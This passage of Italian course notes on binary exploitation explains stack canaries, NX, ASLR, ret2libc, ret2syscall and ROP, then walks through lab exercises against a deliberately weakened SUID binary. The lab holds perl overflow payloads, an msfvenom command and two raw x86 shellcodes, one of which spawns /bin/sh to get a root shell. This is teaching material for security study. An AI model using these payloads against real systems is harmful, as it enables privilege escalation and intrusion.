un pezzo di codice maligno (insieme alla stringa), che può essere eseguito dal processo vittima.</li></ul><ul id="11687afc-a807-434f-b89a-9767168d7122" class="bulleted-list"><li style="list-style-type:circle">Return to LibC = la stringa che viene inserita, inserisce i dati necessari per l’esecuzione di una funzione di libreria C.</li></ul></li></ul><p id="531afff1-ab10-4d86-b09e-7e5caba21376" class=""><mark class="highlight-teal">Canarini</mark></p><p id="1bde70be-c6a0-4612-a659-5d717afe178b" class="">La prima forma di contromisura contro questa tipologia di attacco è l’utilizzo dei canarini. Il concetto di base è quello di inserire, all’interno dello stack, dopo l’indirizzo di ritorno di una chiamata a funzione, un dato di riferimento. Se viene subito un attacco di overflow, il dato in questione viene modificato. Di conseguenza il processo, controllando l’integrità del dato è in grado di rilevare un tentativo di attacco. Questo livello di protezione è fornito dal compilatore e da librerie standard (non da HW).</p><figure id="23bb6a67-38a4-4940-a64d-018ba523c314" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2010.png"><img style="width:199px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2010.png"/></a></figure><p id="eba8b2fd-bd9f-4e89-8a33-cbed1030ca82" class="">L’unico caso in cui l’esito della verifica sia positivo è che l’attaccante indovini il data inserito casualmente (i numeri casuali non sono veramente casuali, ma generati tramite un algoritmo a partire da un seme).</p><p id="06b2547d-3334-4445-9866-f4bb79cd35a2" class=""><mark class="highlight-blue">Shellcoding</mark></p><p id="2f5b290d-0c4d-47fa-89de-6a9f9d59b510" class="">Un altro modo per sfruttare lo stack overflow e consiste nell’iniettare del codice maligno e un indirizzo che punti al codice appena iniettato. L’obbiettivo è quello di aprire una shell con i privilegi del processo attaccato. Nell’iniettare il codice maligno, però, bisogna stare attenti quando si converte in esadecimale poiché se è presente una serie di byte a 0, il primo byte verrà interpretato come un terminatore di stringa (è quindi necessario eseguire un operazione di Zeros Cut-off). In questo caso quindi sullo stack si avrebbe:</p><figure id="0d608f14-df50-460a-aaec-59d3d21f49cb" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2011.png"><img style="width:343px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2011.png"/></a></figure><p id="8fa40b71-e715-45b4-a7fa-c71744ffa8dd" class="">Di ritorno dalla chiamata verrà eseguito il codice esadecimale inserito.</p><p id="912ea18c-b154-4c78-8c1e-3dfd18d8395e" class="">Il problema principale di questa tecnica è indovinare dove è stato allocato il codice all’interno stack. Per avere maggiore garanzia di funzionamento, si può ricorrere all’utilizzo di una sequenza di NOP prima del codice maligno (non viene eseguito nulla per un ciclo di clock). In questo modo viene aumentato il margine in quanto basta che l’indirizzo di ritorno inserito cada in uno dei comandi NOP aggiunti. In questo caso si potrebbero sfruttare anche il contenuto di EBP sostituendolo con dei NOP.</p><p id="245bf734-7cce-46cc-8bdf-34c92437493c" class=""><mark class="highlight-teal">NX-stack</mark></p><p id="fd34f5d0-fe87-4501-ba9b-f6334e80d404" class="">Un modo per contrastare shell scripting è NX stacks, strumento di protezione fornito dall’hardware (non nei sistemi a 32 bit), ma che deve essere supportato dal sistema operativo. Esso permette di inserire dei flag associati a delle pagine di memoria, indicando se sono eseguibili o meno.</p><p id="db7a2c00-63b1-4118-8bfa-1512b5648cc7" class="">Come si fa a girare intorno ad un sistema protetto in questo modo? Bisogna cercare codice utile da eseguire dove si può eseguire, quindi all’interno del text segment. I due metodi principali sono:</p><p id="08140189-b463-47e4-8ded-6e627eacd8be" class=""><span style="border-bottom:0.05em solid">-RET2LIBC</span></p><p id="e989c72d-6536-4ba8-8667-98d001c80b3e" class="">In questo processo si vuole eseguire una funzione di libreria. Per questo motivo è necessario:</p><ul id="77c05ee9-99ed-4dac-94a2-27ab29f84745" class="bulleted-list"><li style="list-style-type:disc">Trovare l’indirizzo della funzione di libreria (incluse nel segmento .txt).</li></ul><ul id="aeed0672-3e12-4c29-a1ab-01191c93bb61" class="bulleted-list"><li style="list-style-type:disc">Trovare un modo per passare sullo stack la stringa di parametro della funzione.</li></ul><ul id="32f295c8-b016-4dd5-bf7e-57fc56c46720" class="bulleted-list"><li style="list-style-type:disc">Fare in modo che l’indirizzo di ritorno sia l’indirizzo dello stack e che venga trovato sullo stack l’indirizzo del parametro.</li></ul><p id="bf140b54-66fc-435b-9ab4-cef95e8c1329" class="">Una contromisura è ASLR, grazie al quale gli indirizzi virtuali di molti segmenti (alcuni, non tutti per esempio il segmento .text poche volte) vengono decisi in maniera randomica dal sistema operativo quando viene caricato il processo. Il sistema operativo utilizza delle tabelle per indirizzamento tra indirizzi virtuali e codice effettivo.</p><p id="7e42b22d-4f63-4c07-952b-9e6b160e684f" class=""><span style="border-bottom:0.05em solid">-RET2SYSCALL</span></p><p id="989f4c12-600b-4aca-8f04-951ffaf2f300" class="">Questo metodo consente l’invocazione di system call. Per eseguirlo è necessario:</p><ul id="f19f7bbb-0c00-4dd9-8d80-73b7ed2d5433" class="bulleted-list"><li style="list-style-type:disc">Caricare l’identificatore della syscall in EAX</li></ul><ul id="fd6cd063-c9ec-4335-aa2b-6e8dd74feed3" class="bulleted-list"><li style="list-style-type:disc">Caricare i parametri in EBX, ECX, EDX, ESI, EDI</li></ul><ul id="3ccce4f7-7f2c-4417-b10d-2f7757262566" class="bulleted-list"><li style="list-style-type:disc">Invocare INT 0x80</li></ul><p id="dc9ef7f2-ca26-4723-b976-95956837c809" class="">Se si è in presenza di NX stack, si possono andare a ricercare nel segmento .text (le funzioni di libreria invocano molte system call) e ricomporre gli indirizzi all’interno dello stack.</p><figure id="b2f28f33-1d6b-43e8-8ae8-fdf7850a34e2" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2012.png"><img style="width:357.7250061035156px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2012.png"/></a></figure><p id="38cae841-96f1-45ea-97ff-f44ddbae9559" class=""><span style="border-bottom:0.05em solid">-Return-Oriented Programming (ROP)</span></p><p id="4e630df2-2f21-4310-b6d9-c4b09f25e8bb" class="">All’interno del segmento .text vengono cercati tutti i gadget, ovvero istruzioni seguite dall’istruzione RET.</p></details></li></ul><ul id="ec5909b0-b177-4202-8b1a-f1fdbc3f4680" class="toggle"><li><details open=""><summary>Laboratorio</summary><p id="e13cdbb8-b667-4e24-a995-02b45c9784ff" class="">Eseguiamo il comando:</p><p id="269babce-e36d-4e18-9a01-4ab90d219409" class=""><code>sudo apt install gcc-multilib</code></p><p id="440bc5a4-f4f3-4726-8183-6b20309e3823" class="">Questo comando permette al compilatore gcc di compilare su diverse architetture, permettendo di lavorare con architetture a 32 bit su macchine a 64 bit. Inoltre è opportuno anche eseguire il comando:</p><p id="3a7ba176-655e-4392-b12f-bb598e7f7481" class=""><code>echo “0” &gt; /proc/sys/kernel/randomize_va_space</code></p><p id="be814221-7f84-4a2a-87fb-52d1a21a77d4" class="">Tale comando permette di disabilitare la randomizzazione della memoria. Una volta eseguiti questi due comandi si può procedere a compilare attraverso il comando:</p><p id="0f8cf804-e12a-458a-8056-05627c1489c8" class=""><code>gcc -o es -fno-stack-protector -m32 -z execstack es.c</code></p><p id="b6e7a3b3-d56d-4cca-91e8-71c43975b00f" class="">Dove la varie opzioni inserite sono:</p><ul id="0eac611d-b8d2-4808-9732-9ce025ad2745" class="bulleted-list"><li style="list-style-type:disc">-fno-stack-protector = disabilita i canarini</li></ul><ul id="f90ad61a-c14d-4330-8f4d-0eba1f1b1859" class="bulleted-list"><li style="list-style-type:disc">-m32 = compila per architettura a 32 bit</li></ul><ul id="47fb9205-5ed1-4daa-b98a-d2fb43c3cd06" class="bulleted-list"><li style="list-style-type:disc">-z execstack = rende lo stack eseguibile</li></ul><p id="d61861a3-8138-43ad-87b1-000d458f8d9a" class="">Per analizzare il sorgente si utilizza un debugger, ovvero GDB il quale offre diversi comandi importanti:</p><ul id="38f11165-292a-4889-8774-dcfd163c4e30" class="bulleted-list"><li style="list-style-type:disc"><code>disass </code>= per disassemblare le funzioni dell’eseguibile, visualizzando le istruzioni assembly.</li></ul><ul id="f32ce42a-1ca9-46a9-8bec-0e902b3c3399" class="bulleted-list"><li style="list-style-type:disc"><code>run STRINGA</code> = per eseguire il programma con input stringa.</li></ul><ul id="99ebcf6f-b567-4f8e-8aa5-8692c4b8fe93" class="bulleted-list"><li style="list-style-type:disc"><code>b * </code>= per inserire un breakpoint. Questo break point può essere inserito anche all’inizio di una funzione (attraverso l’istruzione b *main viene posizionato un breakpoint all’inizio del main).</li></ul><ul id="33f0c87e-533c-4b11-a868-60228fabc6bd" class="bulleted-list"><li style="list-style-type:disc"><code>next </code>= per passare all’istruzione successiva.</li></ul><ul id="1fadbd54-8d01-4b76-80cd-4eae98b8497b" class="bulleted-list"><li style="list-style-type:disc"><code>step </code>= per eseguire di istruzione in istruzione.</li></ul><ul id="21cb0e4c-b714-49e0-9967-79731c855fe7" class="bulleted-list"><li style="list-style-type:disc"><code>continue </code>= per saltare il breakpoint.</li></ul><ul id="a1f548c2-596d-423e-b21a-04ccdc966e58" class="bulleted-list"><li style="list-style-type:disc"><code>x/200xw $esp</code> = per visualizzare i 200 byte successivi a partire dal valore del registro esp, visualizzando lo stack di memoria.</li></ul><ul id="a2534b0f-e309-4288-8b16-02db0f74f147" class="bulleted-list"><li style="list-style-type:disc"><code>info function</code> = serve per visualizzare gli indirizzi di tutte le funzioni caricate in memoria dal processo. Molte funzioni sono funzioni di libreria.</li></ul><ul id="88777501-edc8-4db6-9f63-205f692b51bd" class="bulleted-list"><li style="list-style-type:disc"><code>info register</code> = per visualizzare lo stato attuale dei registri</li></ul><ul id="9cdacf1c-5214-423e-b19e-178d972cead3" class="bulleted-list"><li style="list-style-type:disc"><code>p function</code> = comando che permette di vedere l’indirizzo della funzione function.</li></ul><p id="99c28004-2308-4156-98a6-a04fb0a92fb9" class=""><span style="border-bottom:0.05em solid">Primo esercizio – sovrascrivere l’indirizzo di ritorno</span></p><p id="cab39f21-2dfc-4132-954c-8bfe3043f861" class="">Secondo lo standard di chiamata a processo, vengono poste all’interno dello stack, dall’alto vero il basso, l’indirizzo di ritorno della chiamata a funzione, il valore precedente del registro EBP e successivamente il buffer che viene inserito dall’utente. Se si causa l’overflow del buffer, i 4 byte successivi andranno a sovrascriver EBP e quelli ancora dopo l’indirizzo di ritorno dalla chiamata a funzione, che sarà riempito con il valore esadecimale dei caratteri inseriti in ordine inverso (questo perché scriviamo in little endian e il bit più significativo è a sinistra). Per costruire la stringa di argomento utilizziamo perl:</p><p id="85b542a9-c2d9-4224-b6e5-a097ca133c50" class=""><code>$(perl -e ‘print “A”x100’)</code> à crea una stringa di 100 A che viene mandata in input al programma</p><p id="f7fccc74-c280-4463-9a44-af710abff301" class="">In questo modo viene popolato il buffer senza causare segmentation fault. Se utilizziamo il comando:</p><p id="ce7951de-1b7e-40de-85e4-9b3247540e64" class=""><code>$(perl -e ‘print “A”x104’)</code></p><p id="f132050b-27cb-4a8a-9700-ead283f020fb" class="">Con questo comando viene sovrascritto il contenuto di EBP ma l’indirizzo di ritorno rimane invariato. Invece:</p><p id="a4d7a070-2ca7-4b35-a65d-cdcfb3986683" class=""><code>$(perl -e ‘print “A”x104’, “EDCB”)</code></p><p id="b1d0aff5-1ed2-4c89-b4b6-3c3ddd6d758a" class="">Il valore esadecimale al contrario di EDCB va a sovrascrivere l’indirizzo di ritorno.</p><p id="8fc8c5f3-3e6c-46f2-b109-5d64f3802e22" class=""><span style="border-bottom:0.05em solid">Secondo esercizio – funzione nascosta</span></p><p id="f260b82b-976f-4e73-906d-27dfab920968" class="">Analizzando il codice si vede che è presente una funzione segreta, che non viene mai invocata nel codice. Il nostro obbiettivo è quello di riuscire a sovrascrivere l’indirizzo di ritorno in modo tale da inserire l’indirizzo della funzione segreta. Per fare questo dobbiamo capire quanti caratteri dobbiamo inserire per ottenere l’overflow. Perciò utilizziamo come input:</p><p id="abd9ac1d-fcb6-4af5-b944-2a8408b6b148" class=""><code>$(perl -e ‘print “A”x20’) </code> 0x41414141</p><p id="08520017-0005-4835-b7fe-ffc07e493750" class="">In questo caso viene stampato l’indirizzo di ritorno che ha causato il crash (perché un indirizzo di ritorno che non ha nessun significato o non appartiene allo spazio di indirizzamento del processo). Con l’input inserito vediamo che tutti i 4 byte dell’indirizzo di ritorno sono stati sovrascritti dalle A. Si procede a tentativi per ottenere il giusto input che causi overflow, ma che non sovrascrive l’indirizzo di ritorno dove verrò inserito l’indirizzo della funzione segreta (che si può vedere attraverso il comando info function). Questo si può fare guardando i 41 che vengono inseriti: se per esempio utilizzo come input <code>$(perl -e ‘print “A” x18’)</code> e vedo che il programma  va in buffer overflow con indirizzo 0x56004141 vuol dire che le ultime due A inserite vanno a sovrascrivere l’indirizzo di ritorno. Quindi il mio input per ottenere overflow deve essere:</p><p id="373fb6f6-d731-44b9-a267-58b55896532e" class=""><code>$(perl -e ‘print “A”x16’)</code></p><p id="31ba594f-8e59-4c4d-b9c3-6f76d2850e96" class="">Dopo aver ottenuto l’indirizzo della funzione segreta (indirizzo che deve essere inserito all’inverso), il payload definito è:</p><p id="992ff1c7-e3f7-4308-8e81-74cd2ac81598" class=""><code>$(perl -e ‘print “A” x16’, “\xb9\x61\x55\x56”)</code></p><p id="540c02bb-e434-44e2-8205-099935a80cdf" class=""><span style="border-bottom:0.05em solid">Terzo esercizio - shellcode</span></p><p id="5e3c4982-054e-4e9a-aab5-1f013748b5a8" class="">In questo caso, al posto di eseguire il codice di una funzione si può eseguire del codice malevolo inserito come input, aprendo una shell che ha i privilegi del processo che esegue il programma. Di conseguenza si prende il programma da eseguire si adottano due comandi:</p><p id="15bd0a11-eb55-4600-a034-0e2073897806" class=""><code>sudo chmod u+s es</code> per settare il bit speciale SUID</p><p id="f33e3aa8-fd3f-4a3a-951d-fb41438cb8b9" class=""><code>sudo chown root:root es</code> root diventa proprietario del file es</p><p id="b280d05e-a9ea-4a1a-84c7-a4e8e3415ac7" class="">Eseguendo lo stesso processo di prima, si cerca di capire quando siamo in grado di sovrascrive l’indirizzo di ritorno:</p><p id="fb599be5-a368-4f6c-af2f-232211b0937f" class=""><code>run $(perl -e ‘print “A”x112, ”BBBB”’)</code> 0x42424242</p><p id="3d0af52b-e46c-4e0c-bef5-21f34dd22d4d" class="">Con tale input abbiamo sovrascritto l’indirizzo di memoria. Adesso andiamo ad analizzare la situazione dello stack tramite il comando</p><p id="e53cecdc-4e32-4cdf-9cbb-0662ed9209a4" class=""><code>x/300xw $esp</code></p><p id="2bd9c36a-3bcc-4232-ba57-734f0fab13b4" class="">Così facendo si nota che nello stack è presente un blocco di 41 che rappresentano le A inserite nell’input, raggiungibili agli indirizzi visualizzati. Al posto di questi 41 deve essere inserito lo shellcode anticipato (se lo spazio del buffer lo permette) da dei comandi di NOP (in esadecimale \x90). Invece, come indirizzo di ritorno, deve essere inserito l’indirizzo contenente delle istruzioni NOP. In questo modo, dopo la chiamata a funzione, verranno eseguiti un determinato numero di NOP (a seconda dell’indirizzo scelto) e successivamente il nostro shellcode. Anche lo shellcode deve essere inserito in esadecimale e per farlo si può usare il comando:</p><p id="925232a1-73e7-4fe2-baf0-880772ca7a5b" class=""><code>sudo msfvenom -p linux/x86/exec -f hex -b ‘\x00\xff’ CMD=”uname -a”</code> genera uno shellcode cha fa l’exec di CMD e lo stampa in esadecimale.</p><p id="f2a0ca5d-9aea-4e6b-bf46-df70f0955620" class="">Per vedere la lunghezza di questo esadecimale si possono utilizzare i comandi:</p><p id="54e06869-c23b-4f8b-af25-f37998206a97" class=""><code>python3</code></p><p id="5b345e39-d894-4826-93de-7015c1ca54c1" class=""><code>len(b’     SHELLCODE         ’)</code></p><p id="74846508-abd0-4128-989f-b0cf2830a6b1" class="">Una volta vista la lunghezza dello shellcode si può vedere quanti NOP inserire semplicemente facendo la differenza tra 112 (numero di caratteri per causare overflow) – LUNGHEZZA_SHELLCODE. Il payload finale è:</p><p id="daeb6ff9-4e4b-4f24-861a-780040200c28" class=""><code>$(perl -e ‘print “\x90”x66, ”SHELLCODE”, “INDIRIZZO DI RITORNO”’)</code></p><figure id="d3f842ae-a9e8-466f-a249-6ef6c9a4139e" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2013.png"><img style="width:527px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%2013.png"/></a></figure><p id="21bf9184-7c86-4007-acc2-9990067fd804" class="">Se proviamo ad eseguire il payload fuori da gdb, indicando tutto il path dell’esercizio viene aperta una shell di root. Due shellcode importanti:</p><ul id="3c3674ff-47d0-44cf-9c33-97ee1145ce00" class="bulleted-list"><li style="list-style-type:disc">\xbf\x16\x6e\x8a\x7c\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0c\x31\x7a\x12\x03\x7a\x12\x83\xd4\x6a\x68\x89\xb2\x79\x34\xeb\x10\x18\xac\x26\xf7\x6d\xcb\x51\xd8\x1e\x7c\xa2\x4e\xce\x1e\xcb\xe0\x99\x3c\x59\x14\x90\xc2\x5e\xe4\xd6\xac\x3f\x89\x7d\x11\xed\x30\x7e\x06\xbe\x3b\x9f\x65\xc0 → lunghezza 71</li></ul><ul id="a50b8c50-43be-4934-9065-648e2d2f10cd" class="bulleted-list"><li style="list-style-type:disc">\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 → lunghezza 46</li></ul><p id="ba395e27-6290-4b32-bef6-01aad71b8ce0" class="">Quando usciamo da GDB il payload potrebbe non funzionare perchè lo stack che utilizza GDB potrebbe non essere lo stesso stack utilizzato dalla shell (c&#x27;è di mezzo la virtualizzazione di GDB) e anche il caricamento di variabili d&#x27;ambiente è differente. Per ovviare a questo problema si può: </p><ul id="15e8ff10-2076-4e15-9187-820f72745b09" class="bulleted-list"><li style="list-style-type:disc">Mandare il processo in background con &amp;</li></ul><ul id="906e4520-027c-4f1d-a263-59dd09433437" class="bulleted-list"><li style="list-style-type:disc">Killare il processo con <code>kill -STOP $!</code> </li></ul><ul id="8105dfca-4910-4e57-a15d-f3a290b2ef13" class="bulleted-list"><li style="list-style-type:disc">Analizzare il processo attraverso il comando <code>gdb --pid=NUM</code></li></ul><p id="fcf78a6d-6874-49fd-848a-15a30431ce84" class=""><span style="border-bottom:0.05em solid">Quarto esercizio – return to lib</span></p><p id="f674708e-32d6-4ba7-91aa-031f53e1ef2c" class="">Una strategia per contrastare l’ultimo metodo è quello di non rendere eseguibile il codice sullo stack. Per ovviare a questo problema si può andare direttamente a ricercare del codice all’interno delle librerie, per eseguire la funzione <code>system(“/bin/bash”)</code>. In questo caso l’input deve essere costruito in questo modo:</p><p id="d34e24e5-f274-4f9f-aa6d-f84131006d72" class="">caratteri overflow + indirizzo della system + indirizzo della exit + variabile SHELL (variabile d’ambiente il cui valore è la stringa che vogliamo passare come parametro alla funzione system ovvero /bin/bash)</p><p id="27e22820-b09b-4d3a-96b0-4a85ed67d057" class="">Per trovare questi indirizzi eseguiamo una serie di comandi:</p><p id="b5d24e93-59fc-4112-b5bf-7d04e8729a31" class=""><code>b *main</code> per inserire un breakpoint all’inizio del main</p><p id="8f785e39-8ec5-4153-a97f-0fff89acc123" class=""><code>run</code></p><p id="b45d52c1-c03b-4556-b388-868ef355ce96" class=""><code>p system</code> à per ricavare l’indirizzo di system</p><p id="f6b4054a-7ff7-4c20-9d11-c6b85ddcb4b5" class=""><code>p exit</code> à per ricavare l’indirizzo di exit</p><p id="253d8078-1ccb-4e4c-a14b-28f003a71684" class="">Per trovare la variabile d’ambiente stampiamo lo stack con il comando:</p><p id="bc551d87-c948-4c29-8d57-937861369e68" class=""><code>x/500s $esp</code></p><p id="abeac61b-f8cf-400b-aced-8f72b067e435" class="">e andiamo a cercare la stringa desiderata. L’output della variabile d’ambiente è del tipo SHELL=/bin/bash ma l’unica porzione necessaria è la seconda parte della stringa, senza l’assegnazione. Per ottenere questo risultato basta sommare all’indirizzo della variabile d’ambiente 6 (numero caratteri che non ci interessano)(tramite il comando phyton3 e utilizzando la funzione hex()). Una volta ottenute tutte le informazioni si può costruire il payload (ATTENZIONE agli esadecimali \x00 che vengono convertiti in terminatori di stringa. Si può partire da un po dopo mettendo 0b)</p></details></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>